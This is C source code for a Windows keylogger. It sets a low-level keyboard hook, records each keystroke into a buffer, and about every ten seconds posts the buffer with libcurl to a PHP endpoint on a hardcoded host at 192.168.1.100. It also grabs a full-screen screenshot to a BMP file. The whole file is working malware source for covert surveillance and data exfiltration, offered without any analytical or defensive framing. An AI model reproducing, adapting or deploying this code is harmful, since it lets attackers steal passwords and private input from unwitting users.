#include <stdio.h>
#include <time.h>
#include "curl/curl.h"

#define BUFFERLEN 1024
char *buffer;
unsigned int bufferIndex = 0;
unsigned int bufferSize = BUFFERLEN;
HANDLE mutex;

// Helper function to retrieve current position of file pointer:
inline int GetFilePointer(HANDLE FileHandle){
    return SetFilePointer(FileHandle, 0, 0, FILE_CURRENT);
    }
//---------------------------------------------------------------------------

// Screenshot
//    -> FileName: Name of file to save screenshot to
//    -> lpDDS: DirectDraw surface to capture
//    <- Result: Success
//
BOOL SaveBMPFile(char *filename, HBITMAP bitmap, HDC bitmapDC, int width, int height){
    BOOL Success=FALSE;
    HDC SurfDC=NULL;        // GDI-compatible device context for the surface
    HBITMAP OffscrBmp=NULL; // bitmap that is converted to a DIB
    HDC OffscrDC=NULL;      // offscreen DC that we can select OffscrBmp into
    LPBITMAPINFO lpbi=NULL; // bitmap format info; used by GetDIBits
    LPVOID lpvBits=NULL;    // pointer to bitmap bits array
    HANDLE BmpFile=INVALID_HANDLE_VALUE;    // destination .bmp file
    BITMAPFILEHEADER bmfh;  // .bmp file header

    // We need an HBITMAP to convert it to a DIB:
    if ((OffscrBmp = CreateCompatibleBitmap(bitmapDC, width, height)) == NULL)
        return FALSE;

    // The bitmap is empty, so let's copy the contents of the surface to it.
    // For that we need to select it into a device context. We create one.
    if ((OffscrDC = CreateCompatibleDC(bitmapDC)) == NULL)
        return FALSE;

    // Select OffscrBmp into OffscrDC:
    HBITMAP OldBmp = (HBITMAP)SelectObject(OffscrDC, OffscrBmp);

    // Now we can copy the contents of the surface to the offscreen bitmap:
    BitBlt(OffscrDC, 0, 0, width, height, bitmapDC, 0, 0, SRCCOPY);

    // GetDIBits requires format info about the bitmap. We can have GetDIBits
    // fill a structure with that info if we pass a NULL pointer for lpvBits:
    // Reserve memory for bitmap info (BITMAPINFOHEADER + largest possible
    // palette):
   // if ((lpbi = (LPBITMAPINFO)(new char[sizeof(BITMAPINFOHEADER) + 256 * sizeof(RGBQUAD)])) == NULL) 
     //   return false;

	lpbi = (LPBITMAPINFO)malloc(sizeof(BITMAPINFOHEADER) + 256 * sizeof(RGBQUAD));

    ZeroMemory(&lpbi->bmiHeader, sizeof(BITMAPINFOHEADER));
    lpbi->bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    // Get info but first de-select OffscrBmp because GetDIBits requires it:
    SelectObject(OffscrDC, OldBmp);
    if (!GetDIBits(OffscrDC, OffscrBmp, 0, height, NULL, lpbi, DIB_RGB_COLORS))
        return FALSE;

    // Reserve memory for bitmap bits:

        
        lpvBits = malloc(lpbi->bmiHeader.biSizeImage);

    // Have GetDIBits convert OffscrBmp to a DIB (device-independent bitmap):
    if (!GetDIBits(OffscrDC, OffscrBmp, 0, height, lpvBits, lpbi, DIB_RGB_COLORS))
        return FALSE;

    // Create a file to save the DIB to:
    if ((BmpFile = CreateFile(filename,
                              GENERIC_WRITE,
                              0, NULL,
                              CREATE_ALWAYS,
                              FILE_ATTRIBUTE_NORMAL,
                              NULL)) == INVALID_HANDLE_VALUE)
                              
                              return FALSE;

    DWORD Written;    // number of bytes written by WriteFile
    
    // Write a file header to the file:
    bmfh.bfType = 19778;        // 'BM'
    // bmfh.bfSize = ???        // we'll write that later
    bmfh.bfReserved1 = bmfh.bfReserved2 = 0;
    // bmfh.bfOffBits = ???     // we'll write that later
    if (!WriteFile(BmpFile, &bmfh, sizeof(bmfh), &Written, NULL))
        return FALSE;

    if (Written < sizeof(bmfh)) 
        return FALSE; 

    // Write BITMAPINFOHEADER to the file:
    if (!WriteFile(BmpFile, &lpbi->bmiHeader, sizeof(BITMAPINFOHEADER), &Written, NULL)) 
        return FALSE;
    
    if (Written < sizeof(BITMAPINFOHEADER)) 
            return FALSE;

    // Calculate size of palette:
    int PalEntries;
    // 16-bit or 32-bit bitmaps require bit masks:
    if (lpbi->bmiHeader.biCompression == BI_BITFIELDS) 
        PalEntries = 3;
    else
        // bitmap is palettized?
        PalEntries = (lpbi->bmiHeader.biBitCount <= 8) ?
            // 2^biBitCount palette entries max.:
            (int)(1 << lpbi->bmiHeader.biBitCount)
        // bitmap is TrueColor -> no palette:
        : 0;
    // If biClrUsed use only biClrUsed palette entries:
    if(lpbi->bmiHeader.biClrUsed) 
        PalEntries = lpbi->bmiHeader.biClrUsed;

    // Write palette to the file:
    if(PalEntries){
        if (!WriteFile(BmpFile, &lpbi->bmiColors, PalEntries * sizeof(RGBQUAD), &Written, NULL)) 
            return FALSE;

        if (Written < PalEntries * sizeof(RGBQUAD)) 
            return FALSE;
        }

    // The current position in the file (at the beginning of the bitmap bits)
    // will be saved to the BITMAPFILEHEADER:
    bmfh.bfOffBits = GetFilePointer(BmpFile);

    // Write bitmap bits to the file:
    if (!WriteFile(BmpFile, lpvBits, lpbi->bmiHeader.biSizeImage, &Written, NULL)) 
        return FALSE;
    
    if (Written < lpbi->bmiHeader.biSizeImage) 
        return FALSE;

    // The current pos. in the file is the final file size and will be saved:
    bmfh.bfSize = GetFilePointer(BmpFile);

    // We have all the info for the file header. Save the updated version:
    SetFilePointer(BmpFile, 0, 0, FILE_BEGIN);
    if (!WriteFile(BmpFile, &bmfh, sizeof(bmfh), &Written, NULL))
        return FALSE;

    if (Written < sizeof(bmfh)) 
        return FALSE;

    return TRUE;
    }
    


BOOL ScreenCapture(char *filename)
{	
	HDC hDc = CreateCompatibleDC(0);
	int width = GetDeviceCaps(hDc, HORZRES);
	int height = GetDeviceCaps(hDc, VERTRES);
	HBITMAP hBmp = CreateCompatibleBitmap(GetDC(0), width, height);
	SelectObject(hDc, hBmp);
	BitBlt(hDc, 0, 0, width, height, GetDC(0), 0, 0, SRCCOPY);
	BOOL ret = SaveBMPFile(filename, hBmp, hDc, width, height);
	DeleteObject(hBmp);
	DeleteObject(hDc);
	return ret;
}



int FileSend(char *data, int length)
{
	FILE *log;
	log = fopen("log","a+");
	fprintf(log, "%*s", length, data);
	fclose(log);
	
	return 1;
}

int CurlSend(char *data, int length)
{
	CURL *curl;
	CURLcode res;
	
	curl_global_init(CURL_GLOBAL_ALL);
	curl = curl_easy_init();
	res = CURLE_OK;
	
	if(curl)
	{
		char *inputStr = "input=";
		char *httpStr = curl_easy_escape(curl, data, length);
		
		char *sendStr = (char *)malloc(strlen(inputStr) + strlen(httpStr) + 1);
		strcpy(sendStr, inputStr);
		strcat(sendStr, httpStr);
		
		curl_easy_setopt(curl, CURLOPT_URL, "http://192.168.1.100/send/send.php");
		curl_easy_setopt(curl, CURLOPT_POSTFIELDS, sendStr);
		res = curl_easy_perform(curl);
		curl_easy_cleanup(curl);
		
		curl_free(httpStr);
		free(sendStr);
	}
	
	curl_global_cleanup();
	
	if(res == CURLE_OK)
	{
		return 1;
	}
	
	return 0;	
}

void ConvertKey(unsigned int key, char *outStr)
{
	BYTE keyboardState[256];
	WORD out;
	GetKeyboardState(keyboardState);
	int res = ToAsciiEx(key, MapVirtualKeyEx(key, 0, GetKeyboardLayout(0)), keyboardState, &out, 0, GetKeyboardLayout(0)); 

	if(res == 1)
	{
		outStr[0] = out & 0xff;
		outStr[1] = 0;
	}
	if(res == 2)
	{
		outStr[0] = out & 0xff;
		outStr[1] = (out >> 8) & 0xff;
		outStr[2] = 0;
	}
}

void SaveKey(unsigned int key)
{
	char keyStr[16];
	ConvertKey(key, keyStr);
	
	// lock
	WaitForSingleObject(mutex, INFINITE);
	
	int len = strlen(buffer);
	int available = bufferSize - len;
	
	if (strlen(keyStr) >= available)
	{
		bufferSize *= 2; // raddoppio la grandezza del buffer
		buffer = realloc(buffer, bufferSize);
	}
	
	strcat(buffer, keyStr);
	
	// unlock
	ReleaseMutex(mutex);
}

LRESULT CALLBACK RawInput(int nCode, WPARAM wParam, LPARAM lParam)
{
	KBDLLHOOKSTRUCT *keyboard = (KBDLLHOOKSTRUCT *)lParam;
	
	if (wParam == WM_KEYDOWN)
	{
		SaveKey(keyboard->vkCode);
	}
	
	return 0;
}

DWORD WINAPI KeyLogger()
{
	HHOOK hKeyHook;
	HINSTANCE hExe = GetModuleHandle(NULL);
	hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL,(HOOKPROC)RawInput, hExe, 0);
	MSG msg;
	
	while (GetMessage(&msg, NULL, 0, 0) != 0)
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	
	return 0;
}


int main(void)
{
	ScreenCapture("test.bmp");
	
			
	mutex = CreateMutex(NULL, FALSE, NULL);
	
	buffer = (char*)malloc(BUFFERLEN);
	buffer[0] = 0;
	
	HANDLE logger;
	logger = CreateThread(NULL, 0, KeyLogger, NULL, 0, NULL);
	
	int timer = 0;
	int len;
	
	while(1)
	{
		if(timer > 10)
		{

			// lock
			WaitForSingleObject(mutex, INFINITE);
			
			len = strlen(buffer);
			
			// unlock
			ReleaseMutex(mutex);
			
			int res = CurlSend(buffer, len);
			if(res)
			{
				// lock
				WaitForSingleObject(mutex, INFINITE);
				
				// reset buffer
				strcpy(buffer, buffer + len);
				
				// unlock
				ReleaseMutex(mutex);
			}
			
			timer = 0;
		}
		timer++;
		Sleep(1000); // 1 sec sleep
	}
	
	return 0;
}
